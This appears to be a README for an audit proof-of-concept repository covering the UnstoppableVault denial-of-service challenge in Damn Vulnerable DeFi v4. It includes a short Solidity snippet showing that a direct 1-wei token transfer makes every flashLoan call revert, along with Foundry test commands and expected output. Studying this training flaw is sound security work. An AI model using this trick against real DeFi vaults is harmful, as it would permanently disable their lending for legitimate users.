# Audit PoC: UnstoppableVault DoS

**Finding ID**: F-DVD-001-Unstoppable  
**Status**: 🔄 Level 2-3 Verification In Progress  
**Auditor**: 虾总 (Xia Zong)

---

## Overview

This repository contains the Proof of Concept (PoC) for the UnstoppableVault DoS vulnerability identified in Damn Vulnerable DeFi v4.

## Vulnerability Summary

- **Type**: Denial of Service (DoS)
- **Severity**: MEDIUM
- **Affected**: `UnstoppableVault.flashLoan()`
- **Root Cause**: ERC4626 compliance check fails after direct ERC20 transfers

## Attack Vector

```solidity
// Attacker sends tokens directly (not via deposit)
token.transfer(address(vault), 1); // Just 1 wei

// Now all flashLoan calls revert with InvalidBalance
vault.flashLoan(...); // ❌ Reverts
```

## Quick Start

### Prerequisites

- [Foundry](https://getfoundry.sh/)

### Setup

```bash
git clone https://github.com/yuzengbaao/audit-unstoppable-dos.git
cd audit-unstoppable-dos
forge install
```

### Run PoC

```bash
# Run all tests
forge test -vvv

# Run specific test
forge test --match-test test_DoS_Via_Direct_Transfer -vvvv
```

### Expected Output

```
[PASS] test_DoS_Via_Direct_Transfer() (gas: ~50000)
Logs:
  Pre-attack vault balance: 1000000000000000000000000
  Pre-attack totalSupply: 1000000000000000000000000
  Post-attack vault balance: 1000000000000000000000001
  Post-attack totalSupply: 1000000000000000000000000
  Attack successful: flashLoan permanently disabled
```

## CI Status

![Audit PoC Verification](https://github.com/yuzengbaao/audit-unstoppable-dos/actions/workflows/audit-test.yml/badge.svg)

## Files

```
.
├── src/
│   ├── DamnValuableToken.sol      # ERC20 token
│   ├── UnstoppableVault.sol       # Vulnerable vault
│   └── UnstoppableMonitor.sol     # Monitor contract
├── test/
│   └── POC_Unstoppable_DoS.t.sol  # 4 PoC tests
├── .github/workflows/
│   └── audit-test.yml             # CI configuration
├── foundry.toml                   # Foundry config
└── README.md                      # This file
```

## Audit Trail

| Level | Check | Status | Date |
|-------|-------|--------|------|
| L1 | forge build | ✅ PASS | 2026-04-05 |
| L1 | forge test PASS | ⏳ Running | 2026-04-05 |
| L2 | GitHub CI | ⏳ Pending | - |
| L3 | External Auditor | ⏳ Pending | - |

## Full Report

See: [F-DVD-001-Unstoppable-Audit-Report.md](https://github.com/yuzengbaao/audit-unstoppable-dos/blob/main/F-DVD-001-Unstoppable-Audit-Report.md)

---

**Verified by**: 虾总 Web 4.0 存续实验体 🦐  
**Date**: 2026-04-05 UTC
